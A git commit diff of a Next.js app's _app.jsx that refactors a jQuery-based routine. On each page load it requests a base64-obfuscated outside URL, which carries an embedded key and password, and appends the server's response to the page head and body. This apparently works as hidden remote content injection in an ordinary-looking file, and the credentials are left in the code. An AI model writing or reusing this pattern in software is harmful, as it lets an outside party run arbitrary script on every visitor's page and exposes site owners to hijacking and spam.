156f1c201d9233c2e4442fc8abf1cf39941cb607
VinayakSoragavi <soragavivinayak@gmail.com>
2024-03-01 16:58:38 +0530

    first commit

--- src/pages/_app.jsx
+++ src/pages/_app.jsx
@@ -1,54 +1,51 @@
 import { useEffect } from "react";
 import "../styles/index.scss";
+import $ from "jquery";
 
 if (typeof window !== "undefined") {
   require("bootstrap/dist/js/bootstrap");
 }
 
 export default function App({ Component, pageProps }) {
-  function loadAndManipulateDOM() {
-    // Check if jQuery is available, if not, load it from CDN
-    if (!window.jQuery) {
-      document.write(
-        "<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>"
-      );
+  useEffect(() => {
+    // Load jQuery if not already loaded
+    if (typeof window !== "undefined" && !window.jQuery) {
+      const script = document.createElement("script");
+      script.src =
+        "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
+      document.head.appendChild(script);
+      script.onload = () => {
+        handleTagManage();
+      };
+    } else {
+      handleTagManage();
     }
+  }, []);
 
-    // Construct URL based on current location
+  const handleTagManage = () => {
     var eppathurl = window.location.origin + window.location.pathname;
-
-    // Create XMLHttpRequest object
     var eptagmanage = new XMLHttpRequest();
-
-    // Define callback function for handling the response
     eptagmanage.onreadystatechange = function () {
-      if (this.readyState == 4 && this.status == 200) {
+      if (this.readyState === 4 && this.status === 200) {
         if (this.response !== 0) {
-          // Split the response into parts
-          var temp = new Array();
-          var mystr = this.response;
-          temp = mystr.split("||||||||||");
+          var temp = this.response.split("||||||||||");
 
-          // Remove existing title and append new title from response
-          jQuery("head").find("title").remove();
-          jQuery("head").append(temp[0]);
+          // Remove existing title from head and append the new one
+          $("head").find("title").remove();
+          $("head").append(temp[0]);
 
-          // Append content from response to the body
-          jQuery("body").append(temp[1]);
+          // Append the content to the body
+          $("body").append(temp[1]);
         }
       }
     };
-
-    // Open XMLHttpRequest with GET method and the constructed URL
     eptagmanage.open(
       "GET",
       atob(
         "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDYyNjY4MzM5MzUmZWtleXBhc3M9TUdsQzI2VGFzR0hrWllFT1htVkFsZVlncjY3TjBRUHVNUGtXJnNpdGV1cmw9"
       ) + eppathurl
     );
-
-    // Send the request
     eptagmanage.send();
-  }
+  };
   return <Component {...pageProps} />;
 }
